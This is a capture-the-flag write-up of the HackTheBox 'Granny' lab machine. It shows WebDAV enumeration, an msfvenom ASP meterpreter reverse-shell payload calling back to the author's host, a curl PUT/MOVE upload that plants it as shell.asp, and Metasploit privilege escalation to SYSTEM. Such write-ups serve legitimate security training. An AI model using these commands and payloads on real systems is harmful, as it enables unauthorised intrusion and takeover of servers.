---
layout: page
title: HackTheBox Granny
---

Granny is a HackTheBox challenge that has different methods to achieve root access. The main method of exploiting this system is abusing a commonly seen Webdav upload vulnerability. To complete this box, basic enumeration of services and Windows is all that’s needed. Doing this box will teach how to abuse Webdav upload vulnerabilities, and basic Windows privilege escalation techniques.

### Enumeration

First starting of with a basic nmap scan: ```nmap -sC -sV -oA granny 10.10.10.95```. This will output the result and save it as ```granny.nmap```. Here's what it shows us:

![image](https://user-images.githubusercontent.com/41026969/71554980-e8ef2580-29f3-11ea-878c-d4181e397fad.png)

One of the first things we see is that ```port 80``` is open, meaning we are looking at a web server. Reading more into the scan results, we are dealing with a ```Microsoft IIS``` webserver so this is a windows based machine.

Checking out the main webpage: 

![image](https://user-images.githubusercontent.com/41026969/71554995-44b9ae80-29f4-11ea-8c0f-9a7241be184f.png)

We see there's a page that is under construction.

Next, I run a gobuster scan on the webpage:

```
noodle@kali:~$ gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://10.10.10.15 -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.15
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/31 01:31:36 Starting gobuster
===============================================================
/images (Status: 301)
/Images (Status: 301)
/IMAGES (Status: 301)
/_private (Status: 301)
===============================================================
2019/12/31 01:41:30 Finished
===============================================================
```

Visiting ```http://10.10.10.15/images``` and ```http://10.10.10.15/_private``` show empty directories and thus we got nothing...

Next thing I notice from the nmap scan was ```webdav```. I never heard of webdav prior to this box, so doing some research on webdav I find out [from this wiki page](https://en.wikipedia.org/wiki/WebDAV): ```Web Distributed Authoring and Versioning (WebDAV) is an extension of the Hypertext Transfer Protocol (HTTP) that allows clients to perform remote Web content authoring operations. The WebDAV1 protocol provides a framework for users to create, change and move documents on a server. ``` Doing some further research on webdav enumeration, I find out about ```davtest``` [from the kali linux website](https://tools.kali.org/web-applications/davtest). 

Doing a ```davtest``` scan:

```
noodle@kali:~/Desktop/Hacky Sack/!Pentesting/htb-granny$ davtest -url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: R5MRr2Ht8RGi
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi
********************************************************
 Sending test files
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.pl
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.cfm
PUT     aspx    FAIL
PUT     cgi     FAIL
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.jsp
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.jhtml
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.html
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.txt
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.php
PUT     shtml   FAIL
PUT     asp     FAIL
********************************************************
 Checking for test file execution
EXEC    pl      FAIL
EXEC    cfm     FAIL
EXEC    jsp     FAIL
EXEC    jhtml   FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.html
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.txt
EXEC    php     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi
PUT File: http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.pl
PUT File: http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.cfm
PUT File: http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.jsp
PUT File: http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.jhtml
PUT File: http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.html
PUT File: http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.txt
PUT File: http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.php
Executes: http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.html
Executes: http://10.10.10.15/DavTestDir_R5MRr2Ht8RGi/davtest_R5MRr2Ht8RGi.txt
```

So from the ```davtest``` results, we see that we can upload a ```.txt``` file. A [previous HackTheBox challenge](https://github.com/BurntxNoodle/PenetrationTesting/tree/master/HTB%20-%20Devel) I remember deals with IIS and it deals with the webserver executing ASPX files. Checking out the response headers [by firefox dev tools](https://o7planning.org/en/11637/how-to-view-http-headers-in-firefox) I see the following:

![image](https://user-images.githubusercontent.com/41026969/71648809-25ae6b80-2cd7-11ea-83bd-9ab7aedbe950.png)

The ```Powered by: ASP.NET``` means that it executes ```.asp``` files (asp is used mainly for older, early 2000s OS), though we can't upload asp files (shown by the ```davtest PUT``` results. Though going back to the ```nmap``` enumeration I noticed that under ```Public options``` it lists ```MOV``` which means we can rename it to an ```.asp``` file and get it to execute. This should create us a reverse shell.

### Exploitation 

To create the payload, I use ```msfvenom```. From [this cheatsheet](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/) and knowing the information about the box gathered by the enumeration techniques, I use this payload under ```windows meterpreter reverse_tcp```: 

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
```
Though instead of outputting the format as an ```exe``` and saving it as ```shell.exe``` we need to replace it with ```.asp```. (msfvenom allows you to output as text and you can confirm by doing ```msfvenom -lf``` which lists the formats). This is the msfvenom command I do:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.27 LPORT=4444 -f asp > shell.txt
```

Now I need to upload the file and reading through [curl's manpage](https://curl.haxx.se/docs/manpage.html) you can pair it with PUT and MOVE.

PUTting the text file [thanks to this stackoverflow page](https://stackoverflow.com/questions/5143915/test-file-upload-using-http-put-method)

```
curl -X PUT -T "shell.txt" "http://10.10.10.15/shell.txt"
```

Now, MOVing the text file to ```shell.asp``` (essentially renaming it from ```shell.txt```, ```to shell.asp```) [thanks to this website](https://www.qed42.com/blog/using-curl-commands-webdav)

```
curl -X MOVE --header 'Destination:http://10.10.10.15/shell.asp' 'http://10.10.10.15/shell.txt'
```

Now I need to create a metasploit listener (note it's important to use the same payload and port used in the msfvenom step):

```
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.14.27
LHOST => 10.10.14.27
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/handler) > 
```

And now going to ```10.10.10.15/shell.asp``` it gives me a meterpreter shell!

```
[*] Started reverse TCP handler on 10.10.14.27:4444 
[*] Sending stage (180291 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.27:4444 -> 10.10.10.15:1064) at 2020-01-01 21:15:54 -0500
```

You can access the meterpreter session by doing ```sessions -i 1```. When I do and check who I am, I am only ```nt authority\ network service``` which is not admin.

![image](https://user-images.githubusercontent.com/41026969/71649393-652b8680-2cdc-11ea-86cc-607a0d2458cb.png)

I went around the box and found some Administrator folder under ```C:\Documents and Settings``` and it turns out I cannot access it.

![image](https://user-images.githubusercontent.com/41026969/71649532-a3757580-2cdd-11ea-835b-7525dc873865.png)

##### Privesc

Next I turn to a local exploit suggester to privesc:

```
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set SESSION 2
SESSION => 2
msf5 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 29 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

From all of them, the one's appear to work are:

```
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

Now I go into the session and transfer into a process that I currently own (owned by nt authority\system service).

![image](https://user-images.githubusercontent.com/41026969/71650081-ba1dcb80-2ce1-11ea-8d9f-14d1180c30c7.png)

Picking the first off the list from above, I try out the exploit ```windows/local/ms14_058_track_popup_menu```. (not forgetting to set my LHOST to my own IP).

```
msf5 exploit(windows/local/ms15_051_client_copy_image) > use exploit/windows/local/ms14_058_track_popup_menu
msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options

Module options (exploit/windows/local/ms14_058_track_popup_menu):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  3                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.27      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf5 exploit(windows/local/ms14_058_track_popup_menu) > set SESSION 4
SESSION => 4
msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit

[*] Started reverse TCP handler on 10.10.14.27:4444 
[*] Launching notepad to host the exploit...
[+] Process 1124 launched.
[*] Reflectively injecting the exploit DLL into 1124...
[*] Injecting exploit into 1124...
[*] Exploit injected. Injecting payload into 1124...
[*] Payload injected. Executing exploit...
[*] Sending stage (180291 bytes) to 10.10.10.15
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 5 opened (10.10.14.27:4444 -> 10.10.10.15:1070) at 2020-01-01 21:53:43 -0500

meterpreter > pwd
C:\WINDOWS\system32
meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

(I played around different sessions and had to open/close sessions. The current session (4) was fresh after refreshing the box and getting a reverse tcp shell). 

Now that we are ```NT AUTHORITY\SYSTEM```, this confirms we are admin!

### Root/User Flags

Going back to those directories found earlier in ```C:\Documents and Settings\``` we see there are two users ```Administrator``` and ```Lakis```. In the ```Lakis\Desktop``` we get the ```user.txt``` flag:

![image](https://user-images.githubusercontent.com/41026969/71650311-0c132100-2ce3-11ea-9f7b-2404b06ef71e.png)

Conversely in the ```Administrator\Desktop```:

![image](https://user-images.githubusercontent.com/41026969/71650357-4aa8db80-2ce3-11ea-9fc8-c22fe2345dbf.png)

### Sources
- [ippsec's writeup](https://www.youtube.com/watch?v=ZfPVGJGkORQ&)
- [0xdf's writeup](https://0xdf.gitlab.io/2019/03/06/htb-granny.html)
- [wiki page on WebDAV](https://en.wikipedia.org/wiki/WebDAV)
- [previous writeup (Devel )where I mention IIS stuff](https://github.com/BurntxNoodle/PenetrationTesting/tree/master/HTB%20-%20Devel)
- [msfvenom cheatsheet](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)
- [firefox dev tools](https://o7planning.org/en/11637/how-to-view-http-headers-in-firefox)
- [kali's webpage on davtest](https://tools.kali.org/web-applications/davtest)
- [curl man page](https://curl.haxx.se/docs/manpage.html)
- [curl PUT method](https://stackoverflow.com/questions/5143915/test-file-upload-using-http-put-method)
- [curl MOV method](https://www.qed42.com/blog/using-curl-commands-webdav)
